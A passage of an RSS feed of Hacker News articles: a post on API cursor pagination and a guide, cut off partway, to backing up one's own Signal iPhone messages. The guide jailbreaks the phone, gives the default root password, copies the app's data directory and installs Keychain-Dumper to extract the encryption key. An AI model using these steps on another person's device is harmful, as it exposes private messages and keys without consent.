key="path-0"></path> </svg></a> <a href="https://twitter.com/intent/tweet?text=Why%20You%20Should%20Start%20Contributing%20to%20Open%20Source%20Software%20Right%20Now&amp;url=https%3A%2F%2Fmarkushatvan.com%2Fblog%2Fwhy-you-should-start-contributing-to-open-source-software-right-now" rel="noopener noreferrer" target="_blank" title="Share on Twitter"><svg height="24" role="presentation" style="font-size:1.5em" version="1.1" viewBox="0 0 512 512" width="24"> <path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z" key="path-0"></path> </svg></a> <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fmarkushatvan.com%2Fblog%2Fwhy-you-should-start-contributing-to-open-source-software-right-now&amp;title=Why%20You%20Should%20Start%20Contributing%20to%20Open%20Source%20Software%20Right%20Now" rel="noopener noreferrer" target="_blank" title="Share on Reddit"><svg height="24" role="presentation" style="font-size:1.5em" version="1.1" viewBox="0 0 512 512" width="24"> <path d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z" key="path-0"></path> </svg></a> <a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fmarkushatvan.com%2Fblog%2Fwhy-you-should-start-contributing-to-open-source-software-right-now" rel="noopener noreferrer" target="_blank" title="Share on Pinterest"><svg height="24" role="presentation" style="font-size:1.5em" version="1.1" viewBox="0 0 496 512" width="23.25"> <path d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z" key="path-0"></path> </svg></a></div>   </article></div>]]>
            </description>
            <link>https://markushatvan.com/blog/why-you-should-start-contributing-to-open-source-software-right-now</link>
            <guid isPermaLink="false">hacker-news-small-sites-25547724</guid>
            <pubDate>Sun, 27 Dec 2020 00:40:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[API pagination design]]>
            </title>
            <description>
<![CDATA[
Score 350 | Comments 136 (<a href="https://news.ycombinator.com/item?id=25547716">thread link</a>) | @fagnerbrack
<br/>
December 26, 2020 | https://solovyov.net/blog/2020/api-pagination-design/ | <a href="https://web.archive.org/web/*/https://solovyov.net/blog/2020/api-pagination-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><p>Returning all results for a given query could be a challenge for an API, especially if there are thousands of results. It puts a load on a server, on a client, on a network, and often is unnecessary. Thus people invented pagination.</p>
<p>The usual way to paginate is an offset or a page number. So you make a request like that:</p>
<pre><code>GET /api/products?page=10
{"items": [...100 products]}
</code></pre>
<p>and to continue you make a request like that:</p>
<pre><code>GET /api/products?page=11
{"items": [...another 100 products]}
</code></pre>
<p>In case of a simple offset it‚Äôll look like <code>?offset=1000</code> and <code>?offset=1100</code> ‚Äî it‚Äôs the same old soup, just reheated. It‚Äôll either go straight into SQL query like <code>OFFSET 1000 LIMIT 100</code> or will be multiplied by page size (that <code>LIMIT</code> value). In any case, it‚Äôs a suboptimal solution, since every database has to skip that 1000 rows. And to skip them it needs to identify them. It does not matter if it‚Äôs PostgreSQL, or ElasticSearch, or MongoDB, it‚Äôll have to order them, count them, and throw them away.</p>
<p>This is a kind of work which no one needs. But it repeats over and over again since it‚Äôs <em>easy</em> to implement ‚Äî you directly map your API onto your query to a database.</p>
<p>What do you do then? We could look at what databases do! They have this concept, called <a href="https://en.wikipedia.org/wiki/Cursor_(databases)">cursor</a> ‚Äî it‚Äôs a pointer to a row. So you can say to a database ‚Äúreturn me 100 rows after <strong>that</strong> one‚Äù. And it‚Äôs much easier for a database to do since there is a good chance that you‚Äôll identify the row by a field with an index. And suddenly you don‚Äôt need to fetch and skip those rows, you‚Äôll go directly past them.</p>
<p>An example:</p>
<pre><code>GET /api/products
{"items": [...100 products],
 "cursor": "qWe"}
</code></pre>
<p>API returns an (opaque) string, which you can use then to retrieve the next page:</p>
<pre><code>GET /api/products?cursor=qWe
{"items": [...100 products],
 "cursor": "qWr"}
</code></pre>
<p>Implementation-wise there are many options. Generally, you have some ordering criteria, for example, product id. In this case, you‚Äôll encode your product id with some reversible algorithm (let‚Äôs say <a href="https://hashids.org/">hashids</a>). And on receiving a request with the cursor you decode it and generate a query like <code>WHERE id &gt; :cursor LIMIT 100</code>.</p>
<p>Just a little performance comparison, look at how offsets work:</p>
<pre><code>=# explain analyze select id from product offset 10000 limit 100;
                                                           QUERY PLAN                                                            
---------------------------------------------------------------------------------------------------------------------------------
 Limit  (cost=1114.26..1125.40 rows=100 width=4) (actual time=39.431..39.561 rows=100 loops=1)
   -&gt;  Seq Scan on product  (cost=0.00..1274406.22 rows=11437243 width=4) (actual time=0.015..39.123 rows=10100 loops=1)
 Planning Time: 0.117 ms
 Execution Time: 39.589 ms
</code></pre>
<p>And how where works:</p>
<pre><code>=# explain analyze select id from product where id &gt; 10000 limit 100;
                                                          QUERY PLAN                                                          
------------------------------------------------------------------------------------------------------------------------------
 Limit  (cost=0.00..11.40 rows=100 width=4) (actual time=0.016..0.067 rows=100 loops=1)
   -&gt;  Seq Scan on product  (cost=0.00..1302999.32 rows=11429082 width=4) (actual time=0.015..0.052 rows=100 loops=1)
         Filter: (id &gt; 10000)
 Planning Time: 0.164 ms
 Execution Time: 0.094 ms
</code></pre>
<p>That is a difference of several orders of magnitude! Of course, the actual numbers depend on a size of a table, on your filters and on a store implementation. There <a href="https://use-the-index-luke.com/no-offset">a great article</a> with more technical information - there are slides embedded, see slide 42 for performance comparison.</p>
<p>Of course, nobody orders products by an id ‚Äî you usually order them by some relevancy (and then by id as a <a href="https://stackoverflow.com/a/17330992/46854">tie breaker</a>). In the real world, you‚Äôll have to look at your data to determine what to do. Orders can be ordered by id (as it‚Äôs monotonically increasing). Wishlist items can be ordered like that as well ‚Äî by wishlisting time. In our case products come from ElasticSearch, which naturally supports this cursor stuff.</p>
<p>One deficiency you can see is that it‚Äôs impossible to generate a ‚Äúprevious page‚Äù link with a stateless API. So in case of a user-facing pagination, if it‚Äôs important to have prev/next and ‚Äúgo directly to page 10‚Äù buttons there is no way around this offset/limit stuff. But in other cases using cursor-based pagination can greatly improve performance, especially on really big tables with really deep pagination.</p>
</div></div>]]>
            </description>
            <link>https://solovyov.net/blog/2020/api-pagination-design/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25547716</guid>
            <pubDate>Sun, 27 Dec 2020 00:38:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to backup and decrypt Signal for iPhone message history]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25547699">thread link</a>) | @jonnytran
<br/>
December 26, 2020 | https://cight.co/backup-signal-ios-jailbreak/ | <a href="https://web.archive.org/web/*/https://cight.co/backup-signal-ios-jailbreak/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>I started using Signal 5 years ago as I became increasingly conscious of my data footprint. Around the same time, I closed my Facebook and Instagram accounts, and later, my Google Account.</p><h2 id="the-problem-with-signal">The problem with Signal</h2><p>Signal makes it very difficult, and in most cases, impossible, for one to back up, export, or migrate message data. The Signal team insists these restrictions are meant to protect users‚Äô privacy. However, backup and migration policies differ for each official Signal client and sometimes contradict each other.</p><p>For example, while iOS offers no official backups process, Android backups are built into the app. At the same time, iOS users can migrate their data to a new device (as long as their phone number hasn‚Äôt changed), but this is impossible on Android. Meanwhile, decrypting messages from the desktop client is trivial, but linking one‚Äôs phone and desktop client only syncs messages forward in time.</p><h2 id="why-export-signal-s-message-history">Why export Signal's message history</h2><p>Because it‚Äôs my fucking data.</p><p>The road to exporting my data was long, frustrating and filled with dead ends ‚Äì it took over a year to get here. What's paradoxical is that someone else's phone turned out to be the key to my data. </p><p>In recent years, I moved most of my conversations to Signal, including those with family and close friends. Shortly after we started dating, I asked my partner to switch to Signal, and we‚Äôve used it exclusively ever since. At some point, I thought it would be nice to export our conversation history ‚Äì a sort of time capsule of our relationship. ‚ÄúEasy,‚Äù I thought. I was wrong.</p><p>Since we started dating, I had switched from a OnePlus 2 to an iPhone XS Max. And since migrating from Android to iOS isn‚Äôt possible, part of our conversation history was locked on my old phone. Jailbreaking the iPhone was out of the question since my version of iOS had not been jailbreaken. The Signal Desktop client could have offered an easy avenue to decrypt our chat history, but there was a period of several months during which I had not linked my iPhone to the Signal desktop client.</p><p>I opened a <a href="https://community.signalusers.org/t/ios-backups-through-the-desktop-client/8123">thread about this in the Signal Community Forum</a> in June of 2019. It quickly became apparent that backing up my Signal data would be an uphill battle. </p><p>Luckily, my partner had an iPhone 7, which she recently replaced with a company phone. Her old iPhone contained our entire message history in one place and was easy to jailbreak. Jackpot.</p><p>One important lesson I learned during this process:<strong> to ensure access to your conversation history, install the Desktop client and link it to your mobile device as soon as you start using Signal. </strong>The Signal database and encryption key are both accessible on your computer, allowing for easy decryption. Linking the desktop client later will only sync messages forward in time from the moment the devices are linked.</p><h2 id="tips-to-increase-your-chances-of-exporting-your-signal-database">Tips to increase your chances of exporting your Signal database</h2><p>If you haven‚Äôt linked the desktop client and extracting the iOS database is your only option, this guide is for you. If you've decided to embark upon this journey, here's some advice. </p><h3 id="stop-updating-ios">Stop updating iOS</h3><p>Your best chance of jailbreaking iOS is on older firmware versions. Turn off automatic updates and decline prompts to update iOS.</p><h3 id="backup-shsh-blobs-with-every-new-ios-update">Backup SHSH blobs with every new iOS update</h3><p><a href="https://en.wikipedia.org/wiki/SHSH_blob">SHSH blobs</a> are the digital signatures that Apple generates and uses to personalize iOS firmware files for each iOS device. Apple only signs firmware updates for a limited time after release. Having these signatures handy allows one to install versions of iOS after Apple stops signing them ‚Äì like when a jailbreak becomes available for that version. In some cases, you may be able to downgrade iOS to a previous version.</p><p>Backup SHSH blobs every time Apple releases a new version of iOS (e.g., 14.0, 14.1, 14.1.1). I personally use the <a href="https://github.com/airsquared/blobsaver">blobsaver</a> app, but <a href="https://tsssaver.1conan.com/v2/">TSS Saver</a> is a popular alternative.</p><h3 id="learn-about-jailbreaking-and-stay-up-to-date-on-developments">Learn about jailbreaking and stay up to date on developments</h3><p>Developers and hackers are constantly working to break the security of iOS, and new methods to jailbreak iPhones are frequently made public. Stay informed on jailbreak releases by following the <a href="https://www.reddit.com/r/jailbreak/">/r/jailbreak subreddit</a>.</p><p>This <a href="https://docs.google.com/spreadsheets/d/11DABHIIqwYQKj1L83AK9ywk_hYMjEkcaxpIg6phbTf0/edit#gid=1014970938">exhaustive list of jailbreak compatibility</a> by device and iOS version is also a great resource.</p><p>It's also useful to understand the difference between <a href="https://www.theiphonewiki.com/wiki/Untethered_jailbreak">untethered</a>, <a href="https://www.theiphonewiki.com/wiki/Semi-untethered_jailbreak">semi-untethered</a>, <a href="https://www.theiphonewiki.com/wiki/Semi-tethered_jailbreak">semi-tethered</a>, and <a href="https://www.theiphonewiki.com/wiki/Tethered_jailbreak">tethered</a> jailbreaks.</p><h3 id="recognize-that-this-may-not-work">Recognize that this may not work</h3><p>Depending on your iPhone, you might never be able to jailbreak it or extract Signals decryption key from the iOS Keychain. Apple is making it increasingly difficult to jailbreak iOS devices ‚Äì improvements to hardware and software are leaving fewer cracks for hackers to exploit.</p><p>Ok, let's get our hands dirty. </p><h2 id="how-to-maybe-backup-signal-for-iphone">How to (maybe) backup Signal for iPhone </h2><p>This guide explains how I was able to backup and extract data from Signal's encrypted SQLite database on an iPhone 7 with iOS 13.6.1. </p><h3 id="prerequisites">Prerequisites </h3><ul><li>Physical access to the iPhone with Signal still installed</li><li>An original iPhone cable</li><li>A Mac or Linux computer</li><li>Patience and a bit of luck</li></ul><p>Shell environments will be differentiated as such. </p><pre><code>// Host machine
$ &lt;command&gt;

// iPhone 
root# &lt;command&gt;</code></pre><h3 id="step-1-jailbreak-ios">Step 1: Jailbreak iOS</h3><p>For iOS 13.6.1 on an iPhone 7, I used <strong>checkra1n</strong> which offers a straight forward semi-tethered jailbreak. Depending on the iPhone device and version of iOS, a jailbreak may or may not be available. </p><p>See this <a href="https://docs.google.com/spreadsheets/d/11DABHIIqwYQKj1L83AK9ywk_hYMjEkcaxpIg6phbTf0/edit#gid=1014970938">updated list of iOS jailbreaks</a> for device compatibility and instructions. </p><h3 id="step-2-ssh-into-the-iphone">Step 2: SSH into the iPhone </h3><p>Cydia usually comes with OpenSSH installed and enabled, allowing shell access over IP or USB. If SSH access isn't activated, launch Cydia and install OpenSSH. </p><p><strong>As always, the root password on iOS is <code>alpine</code>.</strong></p><p>If the iPhone and the host machine are on the same network, SSH into the phone using its IP address. It may be found in the phone's WiFi settings. </p><pre><code>$ ssh root@[iphone ip] -p 22</code></pre><p>If SSH over the air isn't possible, USB may be an alternative. However, this involves enabling a proxy service on the host machine.</p><p>First, install <em><em>libimobiledevice</em></em> on the host machine. </p><pre><code>$ brew install libimobiledevice</code></pre><p>Then, edit <em><em>com.usbmux.iproxy.plist</em></em> and append the following XML to the file. </p><pre><code>$ nano ~/Library/LaunchAgents/com.usbmux.iproxy.plist</code></pre><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;Label&lt;/key&gt;
&lt;string&gt;com.usbmux.iproxy&lt;/string&gt;
&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;/usr/local/bin/iproxy&lt;/string&gt;
&lt;string&gt;2222&lt;/string&gt;
&lt;string&gt;22&lt;/string&gt;
&lt;/array&gt;
&lt;key&gt;RunAtLoad&lt;/key&gt;
&lt;true/&gt;
&lt;key&gt;KeepAlive&lt;/key&gt;
&lt;true/&gt;
&lt;/dict&gt;</code></pre><p>And finally, launch the proxy on the host machine. </p><pre><code>$ launchctl load ~/Library/LaunchAgents/com.usbmux.iproxy.plist</code></pre><p>It should now be possible to SSH into the iPhone over USB on port <code>2222</code>.</p><pre><code>$ ssh root@localhost -p 2222</code></pre><h3 id="step-3-install-required-packages">Step 3: Install required packages </h3><p>Once logged into to the iPhone's shell, install the following packages as they will come in handy. </p><pre><code>root# apt install zip unzip nano wget</code></pre><h3 id="step-4-backup-the-signal-data-directory">Step 4: Backup the Signal data directory</h3><p><strong>Locate Signal's data directory</strong></p><p>Much like macOS, iOS stores application data in a <em>Library</em>-like directory. In iOS&nbsp;13, its located here <code>/private/var/mobile/Containers/Shared/AppGroup/</code>. </p><p>Signal's data directory contains the encrypted SQLite database file in <code>./grdb/signal.sqilte</code> and attachments, such as images and videos in <code>./Attachments</code>.</p><p>The data directory may be found by searching the filesystem for Signal's encrypted database file, <code>signal.sqlite</code>.</p><pre><code>root# find / -type f -iname "signal.sqlite"</code></pre><p>That should return something which looks like this:<br><code>/private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/grdb/signal.sqlite</code> </p><p>The Signal directory is: <code>/private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/</code></p><p><strong>Zip the Signal directory</strong></p><p>It is recommended to zip the entire directory, not only the database file, as it also contains images and other message attachments. This archive can reach several gigabytes.</p><pre><code>root# cd /private/var/mobile/Containers/Shared/AppGroup/
root# zip -r signal-backup.zip &lt;Signal directory&gt;

# ex: zip -r signal-backup.zip /private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/</code></pre><p><strong>Retrieve the backup on the host machine</strong></p><p>In a new terminal session on the host machine, use <code>scp</code> to copy the backup. </p><pre><code>$ scp -P 22 root@localhost:/private/var/mobile/Containers/Shared/AppGroup/signal-backup.zip ~/</code></pre><p>Once complete, verify that the backup has fully transferred by unpacking it.</p><p>This is the most complex part of this operation and it helps to have a basic understanding of core iOS development concepts.</p><p><strong>Understanding iOS Entitlements </strong></p><p>From the <a href="https://developer.apple.com/documentation/bundleresources/entitlements">Apple Developer Documentation</a>: </p><blockquote>An entitlement is a right or privilege that grants an executable particular capabilities. For example, an app needs the HomeKit Entitlement ‚Äî along with explicit user consent ‚Äî to access a user‚Äôs home automation network. An app stores its entitlements as key-value pairs embedded in the code signature of its binary executable.</blockquote><p><strong>Enter Keychain Dumper</strong></p><p>We will use <a href="https://github.com/ptoomey3/Keychain-Dumper"><strong>Keychain-Dumper</strong></a> to attempt extracting the Signal encryption key. It requires entitlements to access Keychain data for any particular app. </p><p>Reading through Keychain-Dumper's GitHub issues, I learned that entitlements changed in iOS 13.5 ‚Äì prior to this version, an application <a href="https://github.com/ptoomey3/Keychain-Dumper/issues/52#issuecomment-638174691">could be given wildcard entitlements</a>. Changes in 13.5 made it such that apps need specific entitlements. Thankfully, it's possible to update an executable's entitlements, even as a binary.</p><p>The <code>keychain_dumper</code> binary included in its <a href="https://github.com/ptoomey3/Keychain-Dumper">GitHub repo</a> has wildcard entitlements. We'll need to update them in order to give it permission to decrypt the Signal key.</p><p><strong>Install Keychain Dumper on the iPhone</strong></p><p>Back on the iPhone, download and extract the <a href="https://github.com/ptoomey3/Keychain-Dumper/releases/tag/1.0.0">keychain_dumper binary</a>, and move it to <code>/usr/bin</code>.</p><pre><code>root# wget https://github.com/ptoomey3/Keychain-Dumper/releases/download/1.0.0/keychain_dumper-1.0.0.zip
root# unzip keychain_dumper-1.0.0.zip
root# mv keychain_dumper /usr/bin</code></pre><p><strong>Update <em>keychain_dumper</em>'s ‚Ä¶</strong></p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cight.co/backup-signal-ios-jailbreak/">https://cight.co/backup-signal-ios-jailbreak/</a></em></p>]]>
            </description>
            <link>https://cight.co/backup-signal-ios-jailbreak/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25547699</guid>
            <pubDate>Sun, 27 Dec 2020 00:36:15 GMT</pubDate>
        </item>
    </channel>
</rss>
